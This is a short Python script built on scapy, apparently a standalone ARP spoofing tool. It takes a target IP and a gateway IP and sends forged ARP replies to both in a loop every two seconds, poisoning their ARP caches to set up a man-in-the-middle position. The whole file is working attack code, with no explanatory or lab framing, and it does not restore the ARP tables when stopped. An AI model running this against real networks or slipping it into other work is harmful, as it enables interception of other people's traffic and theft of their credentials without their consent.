from scapy.all import ARP, send, IP, Ether, srp, sr1
import argparse
import time
import sys

def arguments():
    parse = argparse.ArgumentParser()
    parse.add_argument("-t", "--target", dest="target", help="Specify target IP")
    parse.add_argument("-g", "--gateway", dest="gateway", help="Specify router IP")
    return parse.parse_args()

def get_mac(ip):
    packet = ARP(pdst=ip)
    broadcast_packet = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast_packet / packet
    answered_list, _ = srp(arp_broadcast, timeout=1 , verbose=False)

    if answered_list :
        return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

arguments = arguments()
sent_packets = 0
try :
    while True:
        spoof(arguments.target, arguments.gateway)
        spoof(arguments.gateway, arguments.target)
        sent_packets += 2
        print(f"[+] sent packetss :{sent_packets}"),sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("Ctrl + C  Detected")